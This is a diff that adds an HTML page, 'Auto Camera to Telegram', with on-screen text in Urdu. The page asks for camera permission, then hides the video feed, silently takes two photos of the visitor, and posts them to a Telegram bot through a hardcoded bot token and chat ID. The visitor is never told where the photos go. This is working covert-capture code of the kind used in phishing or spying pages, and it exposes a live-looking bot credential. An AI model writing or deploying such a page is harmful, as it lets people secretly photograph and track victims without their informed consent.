@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Auto Camera to Telegram</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; background: #f0f0f0; padding: 30px; }
+    video, canvas { display: none; }
+    #status { margin-top: 20px; font-size: 18px; color: green; }
+  </style>
+</head>
+<body>
+  <h2>📷 تصویر لی جا رہی ہے</h2>
+  <p>براہ کرم اجازت دیں، تصویر لی جا رہی ہے...</p>
+  <div id="status">📸 کیمرہ آن ہو رہا ہے...</div>
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const BOT_TOKEN = "8179356502:AAEzwz_sNhyW30CHOPcV2PaWv0TIcE7Z04Q";
+    const CHAT_ID = "7009447523";
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const statusDiv = document.getElementById("status");
+    const context = canvas.getContext("2d");
+
+    function sendPhoto(blob) {
+      const formData = new FormData();
+      formData.append("chat_id", CHAT_ID);
+      formData.append("photo", blob, "photo.jpg");
+
+      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: formData
+      });
+    }
+
+    function captureAndSend() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(blob => {
+        sendPhoto(blob)
+          .then(res => {
+            if (res.ok) {
+              statusDiv.innerText = "✅ تصویر بھیج دی گئی!";
+            } else {
+              statusDiv.innerText = "❌ تصویر بھیجنے میں مسئلہ!";
+            }
+          })
+          .catch(() => {
+            statusDiv.innerText = "⚠️ نیٹ ورک ایرر!";
+          });
+      }, 'image/jpeg');
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          video.play();
+          statusDiv.innerText = "⏳ تصویر لی جا رہی ہے...";
+
+          // 📸 پہلی تصویر فوراً
+          captureAndSend();
+
+          // 📸 دوسری تصویر 2 سیکنڈ بعد
+          setTimeout(() => {
+            captureAndSend();
+          }, 2000);
+        };
+      })
+      .catch(() => {
+        statusDiv.innerText = "❌ کیمرہ کی اجازت نہیں ملی!";
+      });
+  </script>
+</body>
+</html>
